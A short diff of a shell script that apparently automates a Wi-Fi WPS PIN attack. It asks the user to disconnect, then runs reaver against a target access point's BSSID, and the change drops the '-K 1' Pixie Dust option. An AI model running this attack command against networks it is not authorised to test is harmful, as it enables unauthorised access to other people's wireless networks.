@@ -105,7 +105,7 @@ sleep 1
 
 printf "${Blue}if you connected to another ${Green}Wifi${Force} ${Blue}Please Disconnected ${Force} , ${Cyan}Now Click Enter: "
 read Click
-reaver -i $themon -b $BSSID -c $Chane1 -vv -K 1
+reaver -i $themon -b $BSSID -c $Chane1 -vv 
 
 printf "                                                     ${Green}Step ${Red}3  ${Force}"
 echo ""
